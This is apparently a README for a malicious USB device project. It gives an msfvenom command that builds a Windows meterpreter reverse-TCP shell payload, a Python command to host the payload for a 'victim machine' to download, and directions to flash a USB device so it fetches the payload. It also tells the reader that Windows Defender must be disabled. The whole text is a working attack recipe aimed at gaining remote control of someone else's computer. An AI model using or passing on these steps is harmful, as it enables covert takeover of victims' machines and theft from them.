# Metasploit Download

Throughout this tutorial I will refer to `X.X.X.X` and `XXXX`. When you see `X.X.X.X` you should replace it with your IP address. When you see `XXXX` you should replace it with your chosen port. The default hacker port is `4444`.

Please note that Windows Defender will stop this script from running. Windows Defender must be disabled for this script to work.

## Creating Payload

You must have the [metasploit-framework](https://github.com/rapid7/metasploit-framework) in order for this to work. Installed by default in Kali Linux.

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f exe -e cmd/powershell_base64 > winner.exe.b64
```

## Hosting Payload

Must have Python installed in order for this to work. This creates a local server on your device that the victim machine can download from.

```bash
python -m http.server XXXX
```

## Programming USB

Open [metasploit-download.ino](metasploit-download.ino), go to line 24 and insert your IP address and port. Then upload your script to the USB. 

